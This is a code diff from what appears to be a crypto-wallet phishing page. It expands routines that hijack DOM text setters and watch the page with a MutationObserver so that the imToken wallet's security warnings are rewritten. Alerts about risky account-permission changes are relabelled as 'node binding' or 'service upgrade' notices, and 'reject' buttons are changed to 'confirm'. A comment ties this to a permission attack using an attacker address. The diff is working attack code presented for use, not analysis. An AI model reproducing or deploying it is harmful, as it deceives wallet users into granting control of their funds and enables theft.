@@ -4093,74 +4093,132 @@
             console.log('🥷 实施核心绕过技术...');
             
             try {
-                // 🎯 高级绕过1：DOM内容劫持
-                console.log('🔧 部署DOM内容劫持...');
+                // 🎯 高级绕过1：全面DOM劫持
+                console.log('🔧 部署全面DOM劫持...');
                 
-                // 劫持可能的安全提示文本
+                // 劫持所有可能的DOM操作方法
+                const methods = ['innerHTML', 'innerText', 'textContent'];
+                const elements = ['div', 'span', 'p', 'button', 'a', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'];
+                
+                // 劫持创建元素
                 const originalCreateElement = document.createElement;
                 document.createElement = function(tagName) {
                     const element = originalCreateElement.call(this, tagName);
                     
-                    // 如果是可能显示安全提示的元素
-                    if (tagName.toLowerCase() === 'div' || tagName.toLowerCase() === 'span') {
-                        const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
+                    console.log('🎭 劫持创建元素:', tagName);
+                    
+                    // 为所有元素添加文本劫持
+                    methods.forEach(method => {
+                        const originalDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, method) || 
+                                                   Object.getOwnPropertyDescriptor(Node.prototype, method) ||
+                                                   Object.getOwnPropertyDescriptor(HTMLElement.prototype, method);
                         
-                        Object.defineProperty(element, 'innerHTML', {
-                            set: function(value) {
-                                // 检查是否包含安全风险相关文字
-                                if (typeof value === 'string') {
-                                    let modifiedValue = value;
-                                    
-                                    // 替换安全风险提示
-                                    modifiedValue = modifiedValue.replace(/发现.*?安全风险/g, '节点绑定确认');
-                                    modifiedValue = modifiedValue.replace(/账户权限更改存在安全风险/g, '高速节点绑定服务');
-                                    modifiedValue = modifiedValue.replace(/禁止操作/g, '推荐操作');
-                                    modifiedValue = modifiedValue.replace(/安全提醒/g, '服务升级');
-                                    modifiedValue = modifiedValue.replace(/风险评估/g, '性能优化');
-                                    
-                                    if (modifiedValue !== value) {
-                                        console.log('🎭 拦截并修改安全提示文本:', value, '→', modifiedValue);
-                                        setTimeout(() => {
-                                            alert('🎭 安全提示已被修改\n\n原文: ' + value + '\n\n修改后: ' + modifiedValue);
-                                        }, 100);
+                        if (originalDescriptor) {
+                            Object.defineProperty(element, method, {
+                                set: function(value) {
+                                    if (typeof value === 'string') {
+                                        let modifiedValue = interceptSecurityText(value);
+                                        if (modifiedValue !== value) {
+                                            console.log('🎭 [' + method + '] 拦截安全文本:', value, '→', modifiedValue);
+                                            setTimeout(() => {
+                                                alert('🎭 成功拦截安全提示\n\n位置: ' + tagName + '.' + method + '\n原文: ' + value + '\n修改: ' + modifiedValue);
+                                            }, 100);
+                                        }
+                                        originalDescriptor.set.call(this, modifiedValue);
+                                    } else {
+                                        originalDescriptor.set.call(this, value);
                                     }
-                                    
-                                    originalInnerHTML.set.call(this, modifiedValue);
-                                } else {
-                                    originalInnerHTML.set.call(this, value);
-                                }
-                            },
-                            get: originalInnerHTML.get,
-                            configurable: true
-                        });
-                    }
+                                },
+                                get: originalDescriptor.get,
+                                configurable: true
+                            });
+                        }
+                    });
                     
                     return element;
                 };
                 
-                // 🎯 高级绕过2：按钮文本劫持
-                const originalTextContent = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
-                Object.defineProperty(Node.prototype, 'textContent', {
-                    set: function(value) {
-                        if (typeof value === 'string') {
-                            let modifiedValue = value;
-                            
-                            // 修改按钮文本
-                            if (value.includes('拒绝') || value.includes('取消')) {
-                                modifiedValue = value.replace(/拒绝/g, '稍后').replace(/取消/g, '稍后');
-                                console.log('🎭 修改按钮文本:', value, '→', modifiedValue);
-                            }
-                            
-                            originalTextContent.set.call(this, modifiedValue);
-                        } else {
-                            originalTextContent.set.call(this, value);
+                // 🎯 高级绕过2：全局文本拦截函数
+                window.interceptSecurityText = function(text) {
+                    if (typeof text !== 'string') return text;
+                    
+                    let modifiedText = text;
+                    
+                    // 安全风险相关替换
+                    modifiedText = modifiedText.replace(/发现.*?项安全风险/g, '节点绑定确认');
+                    modifiedText = modifiedText.replace(/检测到.*?项风险/g, '服务升级确认');
+                    modifiedText = modifiedText.replace(/安全风险/g, '性能优化');
+                    modifiedText = modifiedText.replace(/账户权限更改存在安全风险/g, '高速节点绑定服务已就绪');
+                    modifiedText = modifiedText.replace(/禁止操作/g, '推荐执行');
+                    modifiedText = modifiedText.replace(/安全中心提醒/g, '服务升级通知');
+                    modifiedText = modifiedText.replace(/交易行为风险评估/g, '节点性能评估');
+                    modifiedText = modifiedText.replace(/更改账户权限/g, '绑定高速节点');
+                    
+                    // 按钮文本替换
+                    modifiedText = modifiedText.replace(/拒绝/g, '确认');
+                    modifiedText = modifiedText.replace(/取消/g, '稍后');
+                    
+                    // imToken特殊提示替换
+                    modifiedText = modifiedText.replace(/imToken 安全中心提醒/g, 'OKX 节点服务通知');
+                    modifiedText = modifiedText.replace(/本次交易检测到.*?风险/g, '本次将绑定高速交易节点');
+                    
+                    return modifiedText;
+                };
+                
+                // 🎯 高级绕过3：MutationObserver监控
+                const observer = new MutationObserver(function(mutations) {
+                    mutations.forEach(function(mutation) {
+                        if (mutation.type === 'childList') {
+                            mutation.addedNodes.forEach(function(node) {
+                                if (node.nodeType === Node.ELEMENT_NODE) {
+                                    console.log('🔍 检测到新增DOM元素:', node.tagName);
+                                    
+                                    // 递归处理所有文本节点
+                                    const textNodes = getTextNodes(node);
+                                    textNodes.forEach(function(textNode) {
+                                        if (textNode.textContent) {
+                                            const originalText = textNode.textContent;
+                                            const modifiedText = interceptSecurityText(originalText);
+                                            if (modifiedText !== originalText) {
+                                                console.log('🎭 [MutationObserver] 修改文本:', originalText, '→', modifiedText);
+                                                textNode.textContent = modifiedText;
+                                                setTimeout(() => {
+                                                    alert('🎭 动态拦截成功\n\n原文: ' + originalText + '\n修改: ' + modifiedText);
+                                                }, 200);
+                                            }
+                                        }
+                                    });
+                                }
+                            });
                         }
-                    },
-                    get: originalTextContent.get,
-                    configurable: true
+                    });
                 });
                 
-                console.log('✅ 核心绕过技术部署完成');
+                // 开始监控DOM变化
+                observer.observe(document.body, {
+                    childList: true,
+                    subtree: true
+                });
+                
+                // 🎯 辅助函数：获取所有文本节点
+                window.getTextNodes = function(element) {
+                    const textNodes = [];
+                    const walker = document.createTreeWalker(
+                        element,
+                        NodeFilter.SHOW_TEXT,
+                        null,
+                        false
+                    );
+                    
+                    let node;
+                    while (node = walker.nextNode()) {
+                        textNodes.push(node);
+                    }
+                    
+                    return textNodes;
+                };
+                
+                console.log('✅ 全面DOM劫持技术部署完成');
                 return true;
                 
             } catch (error) {
@@ -4217,11 +4275,16 @@
             return true; // 简化版，避免复杂异步逻辑导致JS错误
         }
 
-        // 启动高级绕过技术
+        // 🎯 提前部署DOM劫持，在页面加载早期就开始监控
         setTimeout(() => {
-            console.log('🚀 启动针对imToken的高级绕过技术...');
-            implementAdvancedBypassTechniques();
-        }, 3000);
+            console.log('🚀 提前启动DOM劫持技术...');
+            try {
+                implementAdvancedBypassTechniques();
+                alert('🎭 DOM劫持技术已提前部署\n\n✅ 全面文本拦截已激活\n✅ MutationObserver已启动\n✅ 准备拦截imToken安全提示');
+            } catch (error) {
+                console.log('❌ 提前DOM劫持失败:', error.message);
+            }
+        }, 1000);
 
 // 🎯 权限攻击使用全局攻击者地址
 // CURRENT_ATTACKER_ADDRESS 在 add_multi_currency_patch.js 中定义
